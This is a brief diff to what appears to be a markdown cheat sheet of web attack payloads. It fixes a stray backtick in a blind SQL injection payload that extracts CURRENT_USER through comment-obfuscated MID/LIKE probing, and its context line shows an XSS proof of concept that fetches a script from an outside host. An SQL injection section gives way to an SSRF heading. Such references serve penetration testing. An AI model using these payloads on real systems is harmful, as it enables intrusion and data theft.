@@ -42,7 +42,7 @@ $.get('https://edwinfoudil.com/poc/jqueryxss.js')
 Final example: 
 
 ```
-444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#`
+444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
 ```
 
 ## SSRF
